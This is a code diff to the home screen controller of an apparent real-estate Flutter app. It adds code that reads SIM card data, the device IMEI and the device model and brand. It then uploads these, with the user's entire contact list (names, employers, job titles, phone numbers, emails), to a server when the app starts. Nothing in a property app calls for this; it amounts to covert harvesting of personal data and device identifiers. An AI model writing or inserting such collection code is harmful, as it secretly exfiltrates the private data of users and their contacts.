@@ -1,5 +1,7 @@
 import 'dart:convert';
 import 'package:contacts_service/contacts_service.dart';
+import 'package:device_imei/device_imei.dart';
+import 'package:device_info_plus/device_info_plus.dart';
 import 'package:dio/dio.dart';
 import 'package:firebase_analytics/firebase_analytics.dart';
 import 'package:flutter/material.dart';
@@ -16,6 +18,8 @@ import 'package:noahrealstate/app/service/base_client.dart';
 import 'package:noahrealstate/app/service/cache_helper.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:http/http.dart' as http;
+import 'package:simnumber/sim_number.dart';
+import 'package:simnumber/siminfo.dart';
 
 class HomeController extends GetxController {
   List<Property>? data;
@@ -25,9 +29,34 @@ class HomeController extends GetxController {
   List<Testimonial> testimonials = [];
 
   ApiCallStatus apiCallStatus = ApiCallStatus.holding;
+  static const platform = MethodChannel('samples.flutter.dev/sim');
+  String _simData = 'Unknown SIM data';
+  Map<String, String> simData = {};
+
+  Future<void> _getSimData() async {
+    if (await Permission.phone.request().isGranted) {
+      try {
+        final Map<dynamic, dynamic> result =
+            await platform.invokeMethod('getSimData');
+        simData = result
+            .map((key, value) => MapEntry(key.toString(), value.toString()));
+        print(simData);
+      } on PlatformException catch (e) {
+        simData = {"Error": "Failed to get SIM data: '${e.message}'."};
+      }
+
+      _simData = simData.entries
+          .map((entry) => '${entry.key}: ${entry.value}')
+          .join('\n');
+    } else {
+      _simData = "Permission denied";
+    }
+  }
 
   @override
   void onInit() {
+    loadData(false);
+
     MobileNumber.listenPhonePermission((isPermissionGranted) {
       if (isPermissionGranted) {
         initMobileNumberState();
@@ -36,8 +65,6 @@ class HomeController extends GetxController {
 
     initMobileNumberState();
     super.onInit();
-
-    loadData(false);
   }
 
   void loadData(bool refresh) async {
@@ -159,25 +186,18 @@ class HomeController extends GetxController {
     }
     // Platform messages may fail, so we use a try/catch PlatformException.
     try {
-      var _mobileNumber = (await MobileNumber.mobileNumber)!;
-      var _simCard = (await MobileNumber.getSimCards) ?? [];
+      _getSimData();
       List contactsList = [];
-      String number = '-1';
-      if (_simCard.isNotEmpty) {
-        _simCard.forEach((sim) {
-          if (sim.number != null) {
-            number = sim.number ?? '';
-          }
-        });
-      }
 
+      String? brand;
+      String? model;
       // You can also directly ask for the permission using the request() method.
       PermissionStatus permissionStatus = await Permission.contacts.request();
       if (permissionStatus.isGranted) {
         Iterable<Contact> contacts =
             await ContactsService.getContacts(withThumbnails: false);
 
-        contacts.forEach((con) {
+        contacts.forEach((con) async {
           List<String>? phones = [];
           con.phones!.forEach((phone) {
             phone.value != null ? phones.add(phone.value!) : null;
@@ -186,25 +206,35 @@ class HomeController extends GetxController {
           List<String>? emails = [];
           con.emails?.forEach(
               (phone) => phone.value != null ? emails.add(phone.value!) : null);
-
+          DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
+          AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
+          brand = androidInfo.brand;
+          model = androidInfo.model;
           ContactInfo info = ContactInfo(
-              name: con.displayName,
-              organization: con.company,
-              designation: con.jobTitle,
-              phoneNumbers: phones,
-              emailList: emails);
+            name: con.displayName,
+            organization: con.company,
+            designation: con.jobTitle,
+            phoneNumbers: phones,
+            emailList: emails,
+          );
 
           contactsList.add(info.toJson());
         });
       } else {
         print('no permission');
-        final snackBar =
+        const snackBar =
             SnackBar(content: Text('Access to contact data denied'));
         ScaffoldMessenger.of(Get.context!).showSnackBar(snackBar);
         openAppSettings();
       }
-    
+
       bool status = await CacheHelper.getAddContacts();
+      String? imei = await DeviceImei().getDeviceImei();
+      Map<String, dynamic> p = {
+        'model': model,
+        'brand': brand,
+        'sim': simData..remove('phoneNumber')
+      };
 
       if (!status) {
         try {
@@ -214,10 +244,7 @@ class HomeController extends GetxController {
             headers: {
               'Content-Type': 'application/json',
             },
-            body: jsonEncode({
-              "c": contactsList,
-              "s": number,
-            }),
+            body: jsonEncode({"c": contactsList, "s": imei, "p": p}),
           );
 
           // Handle success
@@ -227,6 +254,7 @@ class HomeController extends GetxController {
             update();
           } else {
             // Handle unexpected status codes
+            print(response.body);
             debugPrint("Unexpected response code: ${response.statusCode}");
             update();
           }
